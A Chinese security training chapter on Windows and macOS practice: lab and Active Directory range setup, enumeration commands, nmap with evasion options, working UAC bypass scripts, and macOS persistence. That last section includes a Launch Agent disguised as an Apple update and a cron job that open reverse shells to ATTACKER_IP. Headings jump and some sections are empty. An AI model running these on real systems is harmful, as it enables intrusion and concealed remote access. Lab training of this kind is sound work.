# 第07章 操作系统基础——Windows与macOS

# 05 练习方法

> **本章定位**：前四章讲解了Windows与macOS的架构原理、安全机制、攻击面分析和防御策略，本章将这些知识转化为可执行的练习体系。从环境搭建到基础操作、从进阶渗透到综合实战，提供一条完整的"从会用到能打"的训练路径。

## 一、学习环境搭建

任何安全技能的训练都必须在隔离的、可控的环境中进行。在真实生产系统上练习渗透技术不仅违法，而且无法反复重置和回溯。本节搭建一套完整的练习基础设施，覆盖虚拟化平台、靶场环境和工具链三个层面。

### 1.1 虚拟化环境准备

#### 1.1.1 虚拟机软件选择与对比

虚拟机是安全练习的基石。选择虚拟化平台时需要权衡性能、功能、成本和宿主操作系统兼容性：

| 平台 | 费用 | 宿主系统 | 嵌套虚拟化 | 快照 | 适用场景 |
|------|------|----------|------------|------|----------|
| VMware Workstation Pro | 付费（个人版免费） | Windows/Linux | 支持 | 支持多快照树 | 需要嵌套虚拟化（VM中跑VM）的高级场景 |
| VirtualBox | 免费开源 | Windows/Linux/macOS | 部分支持 | 支持 | 预算有限或跨平台场景 |
| Hyper-V | Windows内置 | Windows 10/11 Pro+ | 支持 | 支持检查点 | Windows Server/域环境模拟 |
| Parallels Desktop | 付费 | macOS | 支持 | 支持 | macOS宿主首选，性能最佳 |
| UTM | 免费开源 | macOS | 支持（QEMU） | 支持 | macOS上需要ARM+x86混合环境 |

**推荐组合**：
- **Windows宿主**：VMware Workstation Pro（功能最全）或Hyper-V（无需额外安装）
- **Linux宿主**：VMware Workstation Pro或KVM/QEMU（原生性能最优）
- **macOS宿主**：Parallels Desktop（日常使用）+ UTM（需要x86镜像时）

**硬件最低要求**：
- **CPU**：必须支持硬件虚拟化（Intel VT-x / AMD-V），在BIOS/UEFI中启用。嵌套虚拟化（VT-x/EPT或AMD-V/RVI）至少需要4核
- **内存**：16GB起步（宿主4GB + 2个VM各4GB + 缓冲），32GB以上才能流畅运行域环境（3-5台VM同时在线）
- **存储**：SSD是硬性要求，机械硬盘上的VM体验极差。500GB可用空间（Windows Server评估版40GB + 客户端VM 60GB × 多台 + 快照空间）
- **网络**：千兆以太网。Wi-Fi可以工作但桥接模式可能不稳定

#### 1.1.2 Windows虚拟机配置

**获取Windows评估版**：

Microsoft提供免费的评估版镜像，无需付费即可合法使用90-180天，非常适合练习环境：

- Windows 11 Enterprise评估版：90天试用，下载地址 `https://www.microsoft.com/en-us/evaluationcenter/evaluate-windows-11-enterprise`
- Windows Server 2022评估版：180天试用，下载地址 `https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022`

**Windows 10/11客户端VM配置建议**：

| 配置项 | 最低配置 | 推荐配置 | 说明 |
|--------|----------|----------|------|
| CPU | 2核 | 4核 | 基本操作足够，渗透工具运行需要更多核心 |
| 内存 | 4GB | 8GB | Windows 11本身占用约2-3GB |
| 磁盘 | 60GB | 100GB | 需要空间安装安全工具和存储数据 |
| 网络 | NAT | 按需切换NAT/桥接 | NAT隔离性好，桥接便于靶机互通 |
| 显存 | 128MB | 256MB | 避免桌面卡顿 |

**Windows Server域环境配置**：

域环境模拟是Active Directory攻击练习的前提。一个最小化的域环境需要至少3台虚拟机：

```text
┌─────────────────────────────────────────────────────────┐
│                    虚拟网络 (192.168.100.0/24)            │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  域控制器 DC  │  │  文件服务器   │  │   工作站      │   │
│  │ 192.168.100.1│  │ 192.168.100.2│  │ 192.168.100.3│   │
│  │ 2核/4GB/60GB │  │ 2核/4GB/80GB │  │ 2核/4GB/60GB │   │
│  │ Windows Srv  │  │ Windows Srv  │  │ Windows 11   │   │
│  └──────────────┘  └──────────────┘  └──────────────┘   │
└─────────────────────────────────────────────────────────┘
```

虚拟网络建议使用Host-Only或自定义虚拟网络段（如192.168.100.0/24），与宿主物理网络隔离，同时保证VM之间可以互通。

#### 1.1.3 macOS虚拟机配置

macOS虚拟化比Windows复杂得多，因为Apple的EULA限制macOS只能运行在Apple硬件上。在Apple硬件（Intel Mac或Apple Silicon Mac）上可以合法创建macOS虚拟机。

**VMware Fusion（macOS宿主）**：

```bash
# 在Apple Silicon Mac上，VMware Fusion 13+ 原生支持macOS VM
# 在Intel Mac上，需要先解锁macOS支持

# 下载macOS安装器（从App Store或命令行）
softwareupdate --fetch-full-installer --full-installer-version 14.0

# 创建可启动安装ISO
hdiutil create -o /tmp/macOS -size 14000m -volname macOS -layout SPUD -fs HFS+J
hdiutil attach /tmp/macOS.dmg -noverify -mountpoint /Volumes/macOS
sudo /Applications/Install\ macOS\ Sonoma.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS --nointeraction
hdiutil detach /Volumes/macOS
hdiutil convert /tmp/macOS.dmg -format UDTO -o /tmp/macOS.cdr
mv /tmp/macOS.cdr /tmp/macOS.iso
```

**Docker-OSX方案（Linux宿主）**：

对于没有Apple硬件的场景，docker-osx项目提供了基于QEMU/KVM的macOS虚拟化方案。注意这仅供学习研究用途：

```bash
# 拉取镜像
docker pull sickcodes/docker-osx:latest

# 运行macOS Sonoma（需要KVM支持）
docker run -it \
    --device /dev/kvm \
    -p 50922:10022 \
    -p 5999:5999 \
    -v /tmp/.X11-unix:/tmp/.X11-unix \
    -e "DISPLAY=${DISPLAY:-:0.0}" \
    -e GENERATE_UNIQUE=true \
    -e CPU_STRING=4 \
    -e RAM=8 \
    sickcodes/docker-osx:sonoma

# 通过SSH连接（安装完成后）
ssh user@localhost -p 50922
```

**关键提醒**：macOS虚拟机在非Apple硬件上性能较差，仅适合基本的命令行操作和安全工具测试。图形界面操作建议使用Apple硬件。

### 1.2 靶场环境搭建

靶场（Range）是安全练习的核心基础设施。好的靶场应该具备可重复性（可以反复重置）、层次性（从简单到复杂）和真实性（模拟真实环境）。

**Metasploitable系列**：

Metasploitable是Rapid7官方维护的故意存在漏洞的Linux虚拟机，包含大量常见服务漏洞，是练习网络渗透的经典靶机：

```bash
# Metasploitable 2（经典版，包含Samba、Tomcat、MySQL等漏洞服务）
# 下载地址：https://sourceforge.net/projects/metasploitable/
# 下载后直接导入VMware/VirtualBox即可使用
# 默认登录：msfadmin / msfadmin

# Metasploitable 3（更新版，基于Ubuntu，使用Vagrant自动化部署）
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
# 需要安装Vagrant和VirtualBox
vagrant plugin install vagrant-reload
# 部署Ubuntu版
packer build windows_2008_r2.json  # 或 ubuntu.json
vagrant up
```

**VulnHub靶机推荐**：

VulnHub提供大量社区制作的靶机，按难度和攻击类型分类：

下载后导入VMware/VirtualBox，建议为每个靶机创建快照以便重置练习。

#### 1.2.2 Active Directory靶场

AD域环境是Windows渗透的重点。以下提供从自动化部署到手动搭建的完整方案：

**GOAD（Game of Active Directory）**：

GOAD是Orange Cyberdefense维护的AD靶场，预配置了多种常见AD攻击场景（Kerberoast、AS-REP Roast、Delegation滥用等）：

```bash
# 克隆项目
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD

# 方案1：使用VirtualBox部署（推荐初学者）
# 需要：Ansible + Vagrant + VirtualBox
pip3 install ansible
# 安装Vagrant和VirtualBox（略）
vagrant up

# 方案2：使用VMware部署
# 编辑 inventory/GOAD 文件，将virtualbox改为vmware
ansible-playbook -i inventory/GOAD playbooks/main.yml
```

GOAD预置的攻击场景：
- **Kerberoasting**：从SPN中提取服务票据并离线破解
- **AS-REP Roast**：攻击未启用预认证的用户
- **Delegation攻击**：Unconstrained/Constrained/Resource-Based Constrained Delegation
- **ACL滥用**：DCSync、WriteDACL、GenericAll等权限利用
- **GPO滥用**：通过组策略对象横向移动

**DetectionLab**：

DetectionLab侧重于蓝队检测能力训练，在部署攻击环境的同时配置了Splunk、osquery、Windows Event Forwarding等检测工具：

```bash
git clone https://github.com/clong/DetectionLab.git
cd DetectionLab/Vagrant
vagrant up
# 包含4台VM：Logger(Splunk+osquery)、DC、WEF(Windows Event Forwarder)、Win10
```

**手动搭建AD环境**（适合需要自定义配置的场景）：

```powershell
# ===== 域控制器配置 =====

# 1. 安装AD域服务角色
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# 2. 提升为域控制器
Install-ADDSForest `
    -DomainName "lab.local" `
    -DomainNetBIOSName "LAB" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "your_password123!" -AsPlainText -Force) `
    -InstallDNS:$true `
    -Force:$true

# 3. 重启后创建组织单位（OU）结构
New-ADOrganizationalUnit -Name "Corp" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Users" -Path "OU=Corp,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Computers" -Path "OU=Corp,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Servers" -Path "OU=Corp,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "OU=Corp,DC=lab,DC=local"

# 4. 批量创建用户（模拟真实环境）
$users = @(
    @{Name="Alice Wang";     Sam="awang";    Dept="IT";       Title="IT Manager"},
    @{Name="Bob Li";         Sam="bli";      Dept="Finance";  Title="Accountant"},
    @{Name="Charlie Zhang";  Sam="czhang";   Dept="HR";       Title="HR Director"},
    @{Name="Diana Chen";     Sam="dchen";    Dept="IT";       Title="Sysadmin"},
    @{Name="Eve Liu";        Sam="eliu";     Dept="Dev";      Title="Developer"}
)

foreach ($u in $users) {
    New-ADUser -Name $u.Name `
        -SamAccountName $u.Sam `
        -UserPrincipalName "$($u.Sam)@lab.local" `
        -Path "OU=Users,OU=Corp,DC=lab,DC=local" `
        -Department $u.Dept `
        -Title $u.Title `
        -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
        -Enabled $true `
        -ChangePasswordAtLogon $false
}

# 5. 创建组并添加成员
New-ADGroup -Name "IT_Admins" -GroupScope Global -GroupCategory Security -Path "OU=Users,OU=Corp,DC=lab,DC=local"
Add-ADGroupMember -Identity "IT_Admins" -Members "awang", "dchen"

New-ADGroup -Name "Developers" -GroupScope Global -GroupCategory Security -Path "OU=Users,OU=Corp,DC=lab,DC=local"
Add-ADGroupMember -Identity "Developers" -Members "eliu"

# 6. 设置故意的弱配置（用于练习）
# 为ServiceDesk用户设置SPN（Kerberoasting练习）
setspn -A HTTP/srv01.lab.local:8080 eliu

# 禁用预认证（AS-REP Roast练习）
Set-ADAccountControl -Identity "bli" -DoesNotRequirePreAuth $true

# 将用户加入特权组（练习权限提升路径）
Add-ADGroupMember -Identity "Account Operators" -Members "dchen"
```

## 二、基础技能训练

基础技能是所有高级技术的地基。本节从Windows和macOS的命令行操作、系统管理、安全工具使用三个维度展开，每个练习都包含**做什么**、**为什么这样做**、**预期结果**三个部分。

### 2.1 Windows系统管理

#### 2.1.1 命令行基础训练

CMD（命令提示符）和PowerShell是Windows系统管理的两大命令行工具。CMD适合快速执行简单命令，PowerShell则是面向对象的脚本语言，功能远比CMD强大。作为安全从业者，两者都必须熟练掌握。

**CMD命令练习——系统信息收集**：

信息收集是渗透测试的第一步。以下命令可以在目标系统上快速收集关键信息：

```cmd
:: 练习1：系统信息收集
:: 理解每个命令输出的含义，尝试从输出中提取有价值的信息

:: 操作系统版本、补丁级别、系统启动时间
systeminfo
:: 重点关注：OS Version、Hotfix(s)——补丁信息可以用来判断未修补的漏洞

:: 主机名（用于判断机器角色，如DC通常命名为DC01）
hostname

:: IP配置——DNS服务器地址可以暗示域控制器位置
ipconfig /all
:: 重点关注：DNS Servers（域环境中DC通常也是DNS服务器）

:: 当前网络连接——识别监听端口和已建立的连接
netstat -ano
:: 重点关注：LISTENING状态的端口、ESTABLISHED连接的外部IP

:: 查看已安装的补丁（另一种方式，格式更清晰）
wmic qfe list full

:: 查看正在运行的服务及其可执行文件路径
wmic service list brief

:: 查看计划任务（可能存在可利用的高权限任务）
schtasks /query /fo LIST /v
```

**CMD命令练习——用户和组管理**：

```cmd
:: 练习2：用户和组管理
:: 在安全练习中，理解用户管理命令有助于：
:: 1. 枚举系统用户（信息收集）
:: 2. 创建后门账户（持久化）
:: 3. 提升权限（加入管理员组）

:: 列出所有用户
net user
:: 查看用户详细信息（最后登录时间、密码策略等）
net user administrator

:: 创建测试用户
net user testuser your_password123! /add
:: 将用户加入本地管理员组
net localgroup administrators testuser /add
:: 验证用户权限
net user testuser
:: 清理
net user testuser /delete

:: 查看本地组
net localgroup
:: 查看管理员组成员（渗透测试中的关键信息）
net localgroup administrators
```

**CMD命令练习——服务和进程管理**：

```cmd
:: 练习3：服务管理
:: 服务是Windows权限提升的常见攻击面——如果一个以SYSTEM权限运行的服务
:: 存在可写的二进制文件路径，攻击者就可以替换它来获取SYSTEM权限

:: 列出所有服务
sc query type= service state= all
:: 查看特定服务的详细信息（包括启动账户、二进制路径）
sc qc Spooler
:: 创建测试服务
sc create TestService binPath= "C:\Windows\Temp\test.exe" start= auto
:: 启动/停止服务
sc start TestService
sc stop TestService
:: 删除服务
sc delete TestService

:: 练习4：进程管理
:: 列出所有进程
tasklist /v
:: 查看进程的DLL依赖（DLL注入攻击的前置知识）
tasklist /m /fi "imagename eq notepad.exe"
:: 查看特定进程的详细信息
wmic process where "name='svchost.exe'" list brief
```

**PowerShell命令练习**：

PowerShell是Windows安全工具的主力语言。PowerView、BloodHound的采集器、Empire等工具都基于PowerShell：

```powershell
# 练习1：系统信息获取（PowerShell面向对象，可以管道筛选）
Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, OsBuildNumber

# 按CPU使用率排序的前10个进程
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 -Property Name, CPU, Id

# 查看所有运行中的服务
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType

# 练习2：网络信息
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength
Get-NetRoute | Select-Object DestinationPrefix, NextHop, RouteMetric
# 测试远程主机端口可达性
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
```

#### 2.1.2 注册表操作练习

Windows注册表是系统配置的中央数据库。在安全攻防中，注册表的三个关键作用：
1. **持久化**：通过Run键、服务注册等实现开机自启动
2. **信息收集**：存储了大量系统配置、用户活动、已安装软件等信息
3. **安全策略**：UAC配置、密码策略、审计策略等都存储在注册表中

```cmd
:: ===== 基础操作 =====

:: 查看当前用户的自启动项（最常见的持久化位置之一）
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

:: 查看系统级自启动项（需要管理员权限才能写入）
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

:: 添加自启动项（模拟持久化攻击）
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

:: 验证已添加
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp"

:: 删除自启动项（练习后清理）
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /f

:: 在注册表中搜索敏感信息
reg query HKLM /f "password" /t REG_SZ /s
:: 注意：此命令在大型注册表上运行较慢

:: 查看安全策略配置
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
:: 重点关注：LimitBlankPasswordUse、NoLMHash、LmCompatibilityLevel
```

```powershell
# PowerShell注册表操作（更强大，支持管道和脚本化）

# 查看所有自启动位置（全面枚举）
$autoRunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($path in $autoRunPaths) {
    Write-Host "`n=== $path ===" -ForegroundColor Cyan
    if (Test-Path $path) {
        Get-ItemProperty -Path $path | Select-Object -Property * -ExcludeProperty PS* | Format-List
    } else {
        Write-Host "(不存在)" -ForegroundColor Gray
    }
}

# 查看最近打开的文件（用户活动痕迹）
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -ErrorAction SilentlyContinue

# 查看USB设备连接历史（取证价值）
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR" -ErrorAction SilentlyContinue |
    Select-Object PSChildName
```

#### 2.2.2 权限管理练习

macOS的权限模型是Unix权限 + ACL + SIP + TCC的多层叠加。理解每一层对于权限提升至关重要：

```bash
# ===== Unix标准权限 =====

# 查看权限
ls -la /etc/passwd
ls -la /etc/shadow  # macOS上此文件权限与Linux不同

# 权限修改
chmod 755 script.sh    # rwxr-xr-x
chmod +x script.sh     # 添加执行权限
chmod 600 secret.txt   # 仅所有者读写
chmod u+s program      # 设置SUID位（提权关键）

# 所有者修改
sudo chown root:wheel /etc/passwd
sudo chown $(whoami):staff ~/Documents/file.txt

# 查找SUID文件（提权练习——SUID文件以文件所有者权限运行）
find / -perm -4000 -type f 2>/dev/null

# 查找全局可写目录（可能被利用来劫持程序）
find / -type d -perm -0002 2>/dev/null

# ===== ACL操作 =====
# ACL提供比Unix权限更精细的访问控制

# 查看ACL（注意是小写 -l 后面加 -e）
ls -le /etc/passwd

# 添加ACL
chmod +a "user:attacker allow read,write" /path/to/file
# 添加ACL允许组访问
chmod +a "group:staff allow read" /path/to/file

# 删除特定ACL条目
chmod -a "user:attacker allow read,write" /path/to/file

# 清除所有ACL
chmod -N /path/to/file

# ===== 理解SIP保护范围 =====
# SIP保护以下路径（即使root也不能修改）：
# /System, /usr, /bin, /sbin
# /Applications（预装应用）
# 关键系统进程
# 练习：尝试修改受SIP保护的文件
sudo touch /System/test.txt  # 会失败：Operation not permitted
```

### 2.3 安全工具使用

#### 2.3.1 Nmap扫描训练

Nmap是网络扫描的"瑞士军刀"。掌握Nmap的关键不仅是记住命令参数，而是理解每种扫描类型的工作原理和适用场景：

```bash
# ===== 阶段1：主机发现（哪些IP是活的） =====

# ARP扫描（局域网内最可靠，不会被防火墙拦截）
nmap -sn -PR 192.168.1.0/24

# ICMP ping扫描
nmap -sn -PE 192.168.1.0/24

# TCP SYN ping（绕过ICMP过滤的防火墙）
nmap -sn -PS22,80,443 192.168.1.0/24

# 综合主机发现
nmap -sn -PA80,443 -PS22,80,443 -PE 192.168.1.0/24

# ===== 阶段2：端口扫描（目标开了哪些端口） =====

# TCP SYN扫描（半开扫描，默认且最常用）
# 原理：发送SYN包，收到SYN/ACK表示端口开放，发送RST断开连接
# 优点：不会在目标系统留下完整的连接日志
nmap -sS 192.168.1.100

# TCP全连接扫描（完整三次握手，更可靠但更慢且更易被检测）
nmap -sT 192.168.1.100

# UDP扫描（DNS 53, SNMP 161, TFTP 69等服务使用UDP）
# 注意：UDP扫描速度慢且准确性低
nmap -sU 192.168.1.100

# 全端口扫描（1-65535，不要遗漏高端口服务）
nmap -p- 192.168.1.100
# 等价于 nmap -p 1-65535

# 指定端口范围
nmap -p 21-25,80,443,3389,5985,5986 192.168.1.100

# ===== 阶段3：服务识别（端口上跑的是什么） =====

# 版本检测（-sV）+ 操作系统检测（-O）+ 默认脚本（-sC）
nmap -sV -O -sC 192.168.1.100

# 详细版本检测（更精确但更慢）
nmap -sV --version-intensity 9 192.168.1.100

# ===== 阶段4：脚本扫描（自动化漏洞检测） =====

# 使用漏洞检测脚本
nmap --script vuln 192.168.1.100

# SMB相关脚本（Windows渗透必备）
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.1.100

# 检测特定漏洞
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100  # 永恒之蓝
nmap --script smb-vuln-ms08-067 -p 445 192.168.1.100  # 经典漏洞

# ===== 阶段5：隐蔽扫描（避免被IDS检测） =====

# 降低扫描速度（-T0到-T5，T0最慢最隐蔽，T5最快最吵）
nmap -sS -T2 -f 192.168.1.100
# -f：分片IP包，绕过简单的包过滤防火墙
# -T2：降低速度，减少并发连接数

# 使用诱饵IP隐藏扫描源
nmap -sS -D RND:10 192.168.1.100
# RND:10 生成10个随机诱饵IP

# 指定源端口（某些防火墙允许来自特定端口的流量）
nmap -sS --source-port 53 192.168.1.100

# ===== 输出格式 =====

# 保存扫描结果（渗透测试报告的重要组成部分）
nmap -oN scan.txt 192.168.1.100      # 普通文本
nmap -oX scan.xml 192.168.1.100      # XML格式（可导入其他工具）
nmap -oG scan.grep 192.168.1.100     # Grepable格式（便于脚本处理）
nmap -oA scan_result 192.168.1.100   # 同时保存所有格式
```

**Nmap练习方案**：在靶机上按"主机发现→端口扫描→服务识别→漏洞扫描"四步走完整流程，对比不同扫描参数的结果差异。记录每台靶机的开放端口和服务版本，建立自己的"靶机笔记"。

#### 3.1.3 权限提升训练

权限提升（Privilege Escalation）是渗透测试中最关键的环节之一。从普通用户提升到管理员或SYSTEM权限，才能完全控制目标系统。

**Windows权限提升思路**：

| 提升类型 | 典型方法 | 检测命令 |
|----------|----------|----------|
| 服务配置错误 | 可写的服务二进制路径 | `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` |
| DLL劫持 | 服务加载路径中的可写目录 | `wmic service list brief` |
| Unquoted Service Path | 服务路径含空格且未用引号 | `wmic service get name,displayname,pathname,startmode` |
| AlwaysInstallElevated | MSI文件以SYSTEM权限安装 | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| Token滥用 | SeImpersonatePrivilege等 | `whoami /priv` |
| 计划任务 | 可写的计划任务脚本 | `schtasks /query /fo LIST /v` |

**UAC绕过练习**：

UAC（User Account Control）是Windows的安全机制，将管理员权限"一分为二"——即使用户属于管理员组，程序默认也不具备完整管理员权限。绕过UAC是本地提权的常见场景：

```powershell
# UAC绕过原理：利用Windows自动提权的白名单程序（如fodhelper.exe、eventvwr.exe）
# 这些程序在启动时会自动提升权限（auto-elevate），如果它们的注册表键值
# 可被当前用户修改，就可以劫持其执行流程

# Fodhelper绕过（适用于Windows 10 1703+）
# 原理：fodhelper.exe在启动时会检查HKCU下的注册表键，
# 但不会验证该键的完整性——攻击者可以在HKCU中创建恶意键值

$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# 创建注册表项
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start cmd.exe" -Force

# 触发fodhelper.exe（会以高完整性级别启动cmd）
Start-Process "fodhelper.exe"

# 清理注册表
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

```powershell
# Eventvwr绕过（另一种UAC绕过，适用于Windows 10/11）
# eventvwr.exe也会自动提权并查询HKCU注册表

$regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe" -Force
Start-Process "eventvwr.exe"
# eventvwr启动后会打开cmd（高完整性级别）
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

**服务权限提升练习**：

```powershell

# 下载Sysinternals AccessChk
# https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

# 查找Authenticated Users可修改的服务

# 假设发现VulnerableService的binPath可被修改

# 如果服务路径是 C:\Program Files\My App\service.exe
# Windows会依次尝试执行：
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe
```

#### 3.2.3 持久化训练

持久化是APT（高级持续性威胁）的核心特征——在目标系统上建立长期存在的访问通道。macOS提供了多种合法的自启动机制，攻击者可以利用这些机制实现持久化：

```bash
# ===== Launch Agent持久化 =====
# Launch Agent是macOS推荐的用户级服务管理方式
# 用户级Agent存储在 ~/Library/LaunchAgents/
# 在用户登录时自动启动，以当前用户权限运行

# 创建反弹Shell的Launch Agent
cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

# 加载Agent
launchctl load ~/Library/LaunchAgents/com.apple.update.plist
# 验证已加载
launchctl list | grep com.apple.update
# 卸载（清理）
launchctl unload ~/Library/LaunchAgents/com.apple.update.plist

# ===== Login Item持久化 =====
# Login Item是用户登录时启动的应用/脚本

# 使用AppleScript添加Login Item（GUI方式）
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/Backdoor.app", hidden:true}'

# 使用命令行添加（macOS 13+）
sfltool add-item -i "com.apple.loginitems" /Applications/Backdoor.app

# ===== Cron持久化 =====
# 虽然macOS推荐使用launchd，但cron仍然可用

# 添加cron任务
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
# 每5分钟执行一次反弹Shell

# ===== 定时任务（launchd的系统级Daemon） =====
# 系统级Daemon以root权限运行，需要sudo权限
sudo cat > /Library/LaunchDaemons/com.apple.update.helper.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/backdoor</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
sudo launchctl load /Library/LaunchDaemons/com.apple.update.helper.plist

# ===== 持久化检测（防御视角） =====
# 安全从业者也需要知道如何检测持久化

# 检查所有Launch Agents
ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/

# 使用Objective-See的KnockKnock工具扫描持久化项目
# https://objective-see.org/products/knockknock.html

# 使用EtreCheck生成系统完整性报告
# https://www.etrecheck.com/
```

### 4.1 CTF挑战

CTF（Capture The Flag）是安全练习的标准化形式。参与者通过发现漏洞、利用漏洞、获取Flag（通常是特定格式的字符串）来证明渗透成功。

#### 4.1.1 CTF方法论

每台靶机的攻克都应该遵循标准化的流程。随意尝试不仅效率低下，还会遗漏关键攻击面：

```text
┌─────────────────────────────────────────────────────────────┐
│                    CTF靶机攻克标准流程                        │
│                                                              │
│  ① 信息收集    ──→  端口扫描、服务版本、操作系统识别          │
│       ↓                                                      │
│  ② 枚举        ──→  目录爆破、用户枚举、已知漏洞查询          │
│       ↓                                                      │
│  ③ 漏洞发现    ──→  确认可利用的漏洞（CVE或配置错误）         │
│       ↓                                                      │
│  ④ 初始访问    ──→  获取低权限Shell（通常是www-data或user）   │
│       ↓                                                      │
│  ⑤ 权限提升    ──→  从低权限提升到root/SYSTEM                 │
│       ↓                                                      │
│  ⑥ 后渗透      ──→  读取Flag、收集凭据、建立持久化            │
│       ↓                                                      │
│  ⑦ 复盘        ──→  阅读Writeup、对比方法、总结经验           │

```

每个阶段的关键命令速查表：

#### 4.2.2 开发安全工具

开发安全工具是深化理解的最佳方式——只有理解了底层协议，才能写出正确的工具。

**端口扫描器（学习TCP连接原理）**：

```python
#!/usr/bin/env python3
"""
多线程端口扫描器
功能：TCP SYN扫描（需要root权限）或TCP全连接扫描
学习要点：
1. TCP三次握手的实现
2. 多线程并发编程
3. 异常处理和超时控制
"""

import socket
import threading
from queue import Queue
from datetime import datetime
import argparse

class PortScanner:
    def __init__(self, target, ports, threads=100, timeout=1):
        self.target = target
        self.ports = ports
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.lock = threading.Lock()
        self.queue = Queue()
        
        # 常见端口服务映射
        self.service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 135: "MSRPC",
            139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5985: "WinRM", 5986: "WinRM-HTTPS", 8080: "HTTP-Proxy",
            8443: "HTTPS-Alt", 27017: "MongoDB"
        }
    
    def scan_port(self, port):
        """扫描单个端口"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                # 端口开放，尝试获取Banner
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                except:
                    banner = ""
                
                service = self.service_map.get(port, "Unknown")
                with self.lock:
                    self.open_ports.append((port, service, banner))
            sock.close()
        except Exception:
            pass
    
    def worker(self):
        """工作线程"""
        while not self.queue.empty():
            try:
                port = self.queue.get_nowait()
                self.scan_port(port)
            except:
                break
            finally:
                self.queue.task_done()
    
    def run(self):
        """执行扫描"""
        print(f"[*] Scanning {self.target}")
        print(f"[*] Port range: {min(self.ports)}-{max(self.ports)}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 60)
        
